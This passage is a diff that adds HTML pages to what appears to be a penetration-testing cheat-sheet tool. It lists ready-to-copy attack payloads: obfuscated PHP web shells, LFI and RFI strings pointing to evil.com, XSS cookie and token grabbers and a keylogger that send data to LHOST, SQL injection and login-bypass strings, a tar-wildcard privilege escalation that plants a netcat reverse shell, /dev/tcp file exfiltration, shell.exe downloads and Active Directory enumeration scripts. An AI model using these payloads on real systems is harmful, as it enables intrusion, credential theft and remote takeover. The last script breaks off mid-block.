+          <div class="cmd-item"><div class="cmd-lbl">full obfuscated (GET ?0=cmd)</div><div class="cmd-val">&lt;?=$_="";$_="'" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?&gt;</div></div>
+          <div class="cmd-item"><div class="cmd-lbl">function/arg style (?_=system&amp;__=id)</div><div class="cmd-val">&lt;?php $_="{"; $_=($_^"&lt;").($_^"&gt;;").($_^"/"); ?&gt;&lt;?=${'_'.$_}['_'](${'_'.$_}['__']);?&gt;</div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ======== LFI ======== -->
+<div id="page-lfi" class="page">
+  <div class="sp">
+    <div class="sp-hdr">
+      <div class="sp-badge">lfi / path traversal</div>
+      <h1 class="sp-title" id="lfi-title">LFI / Path Traversal</h1>
+      <p class="sp-desc" id="lfi-desc">Local file inclusion payloads, PHP wrappers, and useful target files for Linux/Windows/Apache/MySQL.</p>
+    </div>
+    <div class="sp-body">
+      <div class="tab-nav">
+        <button class="tb on" onclick="switchTab(this,'lfi-tabs','lfi-basic')">traversal</button>
+        <button class="tb" onclick="switchTab(this,'lfi-tabs','lfi-wrappers')">php wrappers</button>
+        <button class="tb" onclick="switchTab(this,'lfi-tabs','lfi-linux')">linux files</button>
+        <button class="tb" onclick="switchTab(this,'lfi-tabs','lfi-windows')">windows files</button>
+        <button class="tb" onclick="switchTab(this,'lfi-tabs','lfi-apache')">apache/mysql</button>
+      </div>
+      <div id="lfi-tabs">
+        <div id="lfi-basic" class="tpane on">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">classic traversal</div><div class="cmd-val">../../../../../../../../etc/passwd</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">null byte bypass (PHP &lt;5.3)</div><div class="cmd-val">../../../../etc/passwd%00</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">double encoding</div><div class="cmd-val">..%252f..%252f..%252fetc%252fpasswd</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">unicode / overlong UTF-8</div><div class="cmd-val">..%c0%af..%c0%af..%c0%afetc%c0%afpasswd</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">path truncation (PHP &lt;5.3)</div><div class="cmd-val">../../../../etc/passwd..........</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">proc/self/environ RCE inject</div><div class="cmd-val">../../proc/self/environ</div></div>
+          </div>
+        </div>
+        <div id="lfi-wrappers" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">base64 encode file</div><div class="cmd-val">?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">expect RCE</div><div class="cmd-val">?page=expect://ls</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">remote file (RFI)</div><div class="cmd-val">?page=http://evil.com/shell.txt</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">input stream RCE (POST body = php)</div><div class="cmd-val">?page=php://input</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">data URI RCE</div><div class="cmd-val">?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=</div></div>
+          </div>
+        </div>
+        <div id="lfi-linux" class="tpane">
+          <div class="cmd-list" id="lfi-linux-list"></div>
+        </div>
+        <div id="lfi-windows" class="tpane">
+          <div class="cmd-list" id="lfi-win-list"></div>
+        </div>
+        <div id="lfi-apache" class="tpane">
+          <div class="cmd-list" id="lfi-apache-list"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ======== XSS ======== -->
+<div id="page-xss" class="page">
+  <div class="sp">
+    <div class="sp-hdr">
+      <div class="sp-badge">cross-site scripting</div>
+      <h1 class="sp-title" id="xss-title">XSS Payloads</h1>
+      <p class="sp-desc" id="xss-desc">XSS payloads for HTML, SVG, Markdown contexts plus data grabbers and blacklist bypasses.</p>
+    </div>
+    <div class="sp-body">
+      <div class="tab-nav">
+        <button class="tb on" onclick="switchTab(this,'xss-tabs','xss-grab')">data grabbers</button>
+        <button class="tb" onclick="switchTab(this,'xss-tabs','xss-html')">html/app</button>
+        <button class="tb" onclick="switchTab(this,'xss-tabs','xss-md')">markdown</button>
+        <button class="tb" onclick="switchTab(this,'xss-tabs','xss-svg')">svg</button>
+        <button class="tb" onclick="switchTab(this,'xss-tabs','xss-bypass')">bypasses</button>
+      </div>
+      <div id="xss-tabs">
+        <div id="xss-grab" class="tpane on">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">cookie grab via redirect</div><div class="cmd-val">&lt;script&gt;document.location='http://LHOST/grab.php?c='+document.cookie&lt;/script&gt;</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">localStorage access_token</div><div class="cmd-val">&lt;script&gt;document.location='http://LHOST/grab.php?c='+localStorage.getItem('access_token')&lt;/script&gt;</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">image beacon (cookie)</div><div class="cmd-val">&lt;script&gt;new Image().src='http://LHOST/c.php?c='+document.cookie;&lt;/script&gt;</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">fetch exfil (base64)</div><div class="cmd-val">&lt;script&gt;fetch('http://LHOST/?c='+btoa(document.cookie))&lt;/script&gt;</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">keylogger skeleton</div><div class="cmd-val">&lt;script&gt;document.onkeypress=function(e){fetch('http://LHOST/?k='+e.key)}&lt;/script&gt;</div></div>
+          </div>
+        </div>
+        <div id="xss-html" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">basic alert</div><div class="cmd-val">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">script tag bypass (filter evasion)</div><div class="cmd-val">&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;script&gt;ipt&gt;</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">attribute breakout</div><div class="cmd-val">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">img onerror</div><div class="cmd-val">&lt;img src=x onerror=alert(1)&gt;</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">img onerror (fromCharCode)</div><div class="cmd-val">&lt;img src=x onerror=alert(String.fromCharCode(88,83,83))&gt;</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">body onload</div><div class="cmd-val">&lt;body onload=alert(1)&gt;</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">input autofocus onfocus</div><div class="cmd-val">&lt;input autofocus onfocus=alert(1)&gt;</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">href javascript</div><div class="cmd-val">&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</div></div>
+          </div>
+        </div>
+        <div id="xss-md" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">markdown link (javascript:)</div><div class="cmd-val">[clickme](javascript:prompt(document.cookie))</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">space obfuscation</div><div class="cmd-val">[a](j a v a s c r i p t:prompt(document.cookie))</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">data URI base64</div><div class="cmd-val">[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">window.onerror</div><div class="cmd-val">[a](javascript:window.onerror=alert;throw%201)</div></div>
+          </div>
+        </div>
+        <div id="xss-svg" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">svg onload</div><div class="cmd-val">&lt;svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/&gt;</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">svg desc CDATA</div><div class="cmd-val">&lt;svg&gt;&lt;desc&gt;&lt;![CDATA[&lt;/desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;&lt;/svg&gt;</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">svg foreignObject CDATA</div><div class="cmd-val">&lt;svg&gt;&lt;foreignObject&gt;&lt;![CDATA[&lt;/foreignObject&gt;&lt;script&gt;alert(2)&lt;/script&gt;]]&gt;&lt;/svg&gt;</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">svg title CDATA</div><div class="cmd-val">&lt;svg&gt;&lt;title&gt;&lt;![CDATA[&lt;/title&gt;&lt;script&gt;alert(3)&lt;/script&gt;]]&gt;&lt;/svg&gt;</div></div>
+          </div>
+        </div>
+        <div id="xss-bypass" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">eval string concat</div><div class="cmd-val">eval('ale'+'rt(1)')</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">Function constructor</div><div class="cmd-val">Function('ale'+'rt(1)')()</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">setTimeout string</div><div class="cmd-val">setTimeout('ale'+'rt(2)')</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">Set.constructor template</div><div class="cmd-val">Set.constructor`alert(1)```</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">new Function template</div><div class="cmd-val">new Function`alert`6``</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">JSFuck-style (alert)</div><div class="cmd-val">[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]</div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ======== SQLI ======== -->
+<div id="page-sqli" class="page">
+  <div class="sp">
+    <div class="sp-hdr">
+      <div class="sp-badge">sql injection</div>
+      <h1 class="sp-title" id="sqli-title">SQL Injection</h1>
+      <p class="sp-desc" id="sqli-desc">UNION, error-based, blind/time-based, and auth bypass payloads for MySQL, MSSQL, Oracle, PostgreSQL.</p>
+    </div>
+    <div class="sp-body">
+      <div class="tab-nav">
+        <button class="tb on" onclick="switchTab(this,'sqli-tabs','sqli-union')">union/enum</button>
+        <button class="tb" onclick="switchTab(this,'sqli-tabs','sqli-blind')">blind/time</button>
+        <button class="tb" onclick="switchTab(this,'sqli-tabs','sqli-auth')">auth bypass</button>
+        <button class="tb" onclick="switchTab(this,'sqli-tabs','sqli-order')">order/group</button>
+      </div>
+      <div id="sqli-tabs">
+        <div id="sqli-union" class="tpane on">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">null probe (MySQL/MSSQL/PG)</div><div class="cmd-val">' UNION SELECT NULL,NULL,NULL-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">null probe (Oracle)</div><div class="cmd-val">' UNION SELECT NULL,NULL,NULL FROM DUAL-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">column count (ORDER BY)</div><div class="cmd-val">' ORDER BY 1-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">version (MySQL/MSSQL)</div><div class="cmd-val">' UNION SELECT @@version-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">version (Oracle)</div><div class="cmd-val">' UNION SELECT banner FROM v$version-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">version (Postgres)</div><div class="cmd-val">' UNION SELECT version()-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">tables (MySQL/MSSQL/PG)</div><div class="cmd-val">' UNION SELECT table_name,NULL FROM INFORMATION_SCHEMA.TABLES-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">tables (Oracle)</div><div class="cmd-val">' UNION SELECT table_name,NULL FROM all_tables-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">columns (MySQL/MSSQL/PG)</div><div class="cmd-val">' UNION SELECT column_name,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='X'-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">concat values (MySQL/PG)</div><div class="cmd-val">' UNION SELECT concat(col1,':',col2) FROM tablename LIMIT 1-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">concat values (Oracle/PG)</div><div class="cmd-val">' UNION SELECT col1||':'||col2,NULL FROM tablename-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">concat values (MSSQL)</div><div class="cmd-val">' UNION SELECT col1+':'+col2,NULL FROM tablename-- -</div></div>
+          </div>
+        </div>
+        <div id="sqli-blind" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">time-based (MySQL)</div><div class="cmd-val">,(SELECT * FROM (SELECT(SLEEP(5)))a)</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">time-based (MSSQL)</div><div class="cmd-val">'; WAITFOR DELAY '0:0:5'--</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">conditional error (MySQL)</div><div class="cmd-val">' UNION SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">conditional error (Postgres)</div><div class="cmd-val">' UNION SELECT CASE WHEN (1=1) THEN cast(1/0 as text) ELSE NULL END-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">conditional error (Oracle)</div><div class="cmd-val">' UNION SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">conditional error (MSSQL)</div><div class="cmd-val">' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END-- -</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">error-based extractvalue (MySQL)</div><div class="cmd-val">' AND extractvalue(1,concat(0x7e,(SELECT version())))--</div></div>
+          </div>
+        </div>
+        <div id="sqli-auth" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">or true</div><div class="cmd-val">or true--</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">double-quote close</div><div class="cmd-val">") or true--</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">single-quote close</div><div class="cmd-val">') or true--</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">admin bypass (--)</div><div class="cmd-val">admin') or ('1'='1'--</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">admin bypass (#)</div><div class="cmd-val">admin') or ('1'='1'#</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">1=1 always true</div><div class="cmd-val">' OR '1'='1</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">version check probe</div><div class="cmd-val">' AND MID(VERSION(),1,1) = '5';</div></div>
+          </div>
+        </div>
+        <div id="sqli-order" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">ORDER BY column count 1</div><div class="cmd-val">1' ORDER BY 1--+</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">ORDER BY column count 2</div><div class="cmd-val">1' ORDER BY 2--+</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">ORDER BY column count 3</div><div class="cmd-val">1' ORDER BY 3--+</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">GROUP BY 1,2,3</div><div class="cmd-val">1' GROUP BY 1,2,3--+</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">GROUP BY having</div><div class="cmd-val">' GROUP BY columnnames having 1=1--</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">UNION 3 cols</div><div class="cmd-val">-1' UNION SELECT 1,2,3--+</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">INTO @ probe (MSSQL)</div><div class="cmd-val">-1 UNION SELECT 1 INTO @,@,@</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">sysobjects enum (MSSQL)</div><div class="cmd-val">' and 1 in (select min(name) from sysobjects where xtype='U' and name > '.')--</div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ======== LINUX ======== -->
+<div id="page-linux" class="page">
+  <div class="sp">
+    <div class="sp-hdr">
+      <div class="sp-badge">linux recon</div>
+      <h1 class="sp-title" id="linux-title">Linux Commands</h1>
+      <p class="sp-desc" id="linux-desc">Post-exploitation Linux enumeration, SUID, cron, network, privesc, and file transfer commands.</p>
+    </div>
+    <div class="sp-body">
+      <div class="tab-nav">
+        <button class="tb on" onclick="switchTab(this,'linux-tabs','linux-suid')">suid/caps</button>
+        <button class="tb" onclick="switchTab(this,'linux-tabs','linux-sysinfo')">sysinfo</button>
+        <button class="tb" onclick="switchTab(this,'linux-tabs','linux-cron')">cron</button>
+        <button class="tb" onclick="switchTab(this,'linux-tabs','linux-net')">network</button>
+        <button class="tb" onclick="switchTab(this,'linux-tabs','linux-portfwd')">port forward</button>
+        <button class="tb" onclick="switchTab(this,'linux-tabs','linux-filetransfer')">file transfer</button>
+      </div>
+      <div id="linux-tabs">
+        <div id="linux-suid" class="tpane on">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">find SUID root files</div><div class="cmd-val">find / -user root -perm /4000 2>/dev/null</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">find SUID (alt)</div><div class="cmd-val">find / -perm -u=s -type f 2>/dev/null</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">find SUID list</div><div class="cmd-val">find / -user root -perm -4000 -exec ls -ldb {} \; > /tmp/suid</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">capabilities</div><div class="cmd-val">getcap -r / 2>/dev/null</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">world-writable files</div><div class="cmd-val">find / -perm -o+w -type f 2>/dev/null | grep -v proc</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">find txt files</div><div class="cmd-val">find / -type f -name '*.txt' 2>/dev/null</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">TAR wildcard privesc step 1</div><div class="cmd-val">echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 1234 >/tmp/f" > shell.sh</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">TAR wildcard privesc step 2</div><div class="cmd-val">touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">TAR wildcard privesc step 3</div><div class="cmd-val">touch "/var/www/html/--checkpoint=1"</div></div>
+          </div>
+        </div>
+        <div id="linux-sysinfo" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">OS release</div><div class="cmd-val">cat /etc/issue; cat /etc/*-release</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">kernel version</div><div class="cmd-val">uname -a; cat /proc/version</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">env variables</div><div class="cmd-val">cat /etc/profile; cat ~/.bashrc; env</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">service configs</div><div class="cmd-val">cat /etc/apache2/apache2.conf; cat /etc/my.conf</div></div>
+          </div>
+        </div>
+        <div id="linux-cron" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">list user crontab</div><div class="cmd-val">crontab -l</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">list cron spool</div><div class="cmd-val">ls -alh /var/spool/cron</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">all cron files</div><div class="cmd-val">ls -al /etc/cron*; cat /etc/crontab; cat /etc/anacrontab</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">root crontab</div><div class="cmd-val">cat /var/spool/cron/crontabs/root</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">at allow/deny</div><div class="cmd-val">cat /etc/at.allow; cat /etc/at.deny; cat /etc/cron.allow; cat /etc/cron.deny</div></div>
+          </div>
+        </div>
+        <div id="linux-net" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">open connections</div><div class="cmd-val">lsof -i; netstat -antup; netstat -tulpn</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">port 80 check</div><div class="cmd-val">lsof -i :80; grep 80 /etc/services</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">login history</div><div class="cmd-val">last; lastlog</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">running services</div><div class="cmd-val">chkconfig --list; chkconfig --list | grep 3:on</div></div>
+          </div>
+        </div>
+        <div id="linux-portfwd" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">SSH local port forward</div><div class="cmd-val">ssh -L 8080:127.0.0.1:80 root@192.168.1.7</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">SSH remote port forward</div><div class="cmd-val">ssh -R 8080:127.0.0.1:80 root@192.168.1.7</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">nc port relay</div><div class="cmd-val">mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">nc proxy (port 80→8080)</div><div class="cmd-val">mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe</div></div>
+          </div>
+        </div>
+        <div id="linux-filetransfer" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">python3 HTTP server</div><div class="cmd-val">python3 -m http.server 8080</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">python2 HTTP server</div><div class="cmd-val">python -m SimpleHTTPServer 8080</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">bash upload over HTTP</div><div class="cmd-val">bash -c 'echo -e "POST / HTTP/0.9\n$(cat file)" > /dev/tcp/LHOST/PORT'</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">bash TCP exfil (receiver)</div><div class="cmd-val">nc -l -p 54 > data</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">bash TCP exfil (sender)</div><div class="cmd-val">bash -c 'cat file > /dev/tcp/LHOST/54'</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">nc send file</div><div class="cmd-val">nc -lnvp 54 > file_saved</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">nc receive file</div><div class="cmd-val">nc LHOST 54 &lt; file_to_send</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">SCP upload</div><div class="cmd-val">scp file user@192.168.1.1:~/dest -P 22</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">SCP download</div><div class="cmd-val">scp user@192.168.1.1:~/file saved_file -P 22</div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ======== WINDOWS ======== -->
+<div id="page-windows" class="page">
+  <div class="sp">
+    <div class="sp-hdr">
+      <div class="sp-badge">windows / active directory</div>
+      <h1 class="sp-title" id="windows-title">Windows & AD</h1>
+      <p class="sp-desc" id="windows-desc">PowerShell enumeration, Active Directory recon via PowerView, and AD LDAP scripts.</p>
+    </div>
+    <div class="sp-body">
+      <div class="tab-nav">
+        <button class="tb on" onclick="switchTab(this,'win-tabs','win-sysinfo')">sysinfo</button>
+        <button class="tb" onclick="switchTab(this,'win-tabs','win-http')">http/download</button>
+        <button class="tb" onclick="switchTab(this,'win-tabs','win-ad')">active directory</button>
+        <button class="tb" onclick="switchTab(this,'win-tabs','win-ad-scripts')">ad scripts</button>
+      </div>
+      <div id="win-tabs">
+        <div id="win-sysinfo" class="tpane on">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">system info</div><div class="cmd-val">systeminfo; Get-WmiObject Win32_ComputerSystem</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">hostname + domain</div><div class="cmd-val">echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">security patches</div><div class="cmd-val">Get-Hotfix -description "Security update"</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">hotfix (wmic)</div><div class="cmd-val">wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">env variables</div><div class="cmd-val">Get-ChildItem Env: | ft Key,Value</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">WLAN profiles</div><div class="cmd-val">netsh wlan show profiles</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">WLAN password</div><div class="cmd-val">netsh wlan show profile name="PROFILE-NAME" key=clear</div></div>
+          </div>
+        </div>
+        <div id="win-http" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">wget equiv (PowerShell)</div><div class="cmd-val">Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe"</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">certutil download</div><div class="cmd-val">certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">bitsadmin download</div><div class="cmd-val">bitsadmin /transfer job /download /priority high http://10.10.10.10/file C:\file</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">PS Net.WebClient</div><div class="cmd-val">(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/file','C:\file')</div></div>
+          </div>
+        </div>
+        <div id="win-ad" class="tpane">
+          <div class="cmd-list">
+            <div class="cmd-item"><div class="cmd-lbl">PowerView URL</div><div class="cmd-val">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">domain enum</div><div class="cmd-val">Get-NetDomain; Get-NetForestDomain; Get-DomainSID</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">domain policy</div><div class="cmd-val">Get-DomainPolicy</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">OUs</div><div class="cmd-val">Get-NetOU</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">domain trusts</div><div class="cmd-val">Get-NetDomainTrust</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">GPO on computer</div><div class="cmd-val">Get-NetGPO -ComputerName computername.domain.com</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">password last set</div><div class="cmd-val">Get-UserProperty –Properties pwdlastset</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">description field (pass hunt)</div><div class="cmd-val">Find-UserField -SearchField Description -SearchTerm "pass"</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">list computers</div><div class="cmd-val">Get-NetComputer; Get-NetComputer -Ping</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">OS filter</div><div class="cmd-val">Get-NetComputer -OperatingSystem "Windows 7 Ultimate"</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">domain admins</div><div class="cmd-val">Get-NetGroupMember -GroupName "Domain Admins"</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">admin groups</div><div class="cmd-val">Get-NetGroup *admin*</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">user ACL</div><div class="cmd-val">Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">password reset rights</div><div class="cmd-val">Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">export users (ldifde)</div><div class="cmd-val">ldifde -d "OU=THING,DC=CHANGE,DC=ME" -p subtree -f dump.ldf</div></div>
+            <div class="cmd-item"><div class="cmd-lbl">export users (csvde)</div><div class="cmd-val">csvde -d "OU=THING,DC=CHANGE,DC=ME" -p subtree -f dump.csv</div></div>
+          </div>
+        </div>
+        <div id="win-ad-scripts" class="tpane">
+          <div class="cb"><div class="cb-hdr"><span class="cb-lang">powershell — enumerate domain users</span><button class="cpbtn" onclick="copyById('ps-users')">copy</button></div>
+          <pre id="ps-users">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://" + $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.SearchRoot = $objDomain
+$Searcher.filter = "samAccountType=805306368"
+$Result = $Searcher.FindAll()
+Foreach($obj in $Result) {
+  Foreach($prop in $obj.Properties) { $prop }
+  Write-Host "------------------------"
+}</pre></div>
+          <div class="cb" style="margin-top:10px;"><div class="cb-hdr"><span class="cb-lang">powershell — enumerate domain groups</span><button class="cpbtn" onclick="copyById('ps-groups')">copy</button></div>
+          <pre id="ps-groups">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://" + $PDC + "/" + "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.filter = "(objectClass=Group)"
+$Searcher.FindAll() | Foreach { $_.Properties.name }</pre></div>
+          <div class="cb" style="margin-top:10px;"><div class="cb-hdr"><span class="cb-lang">powershell — detect SPNs</span><button class="cpbtn" onclick="copyById('ps-spn')">copy</button></div>
+          <pre id="ps-spn">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://" + $PDC + "/" + "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry
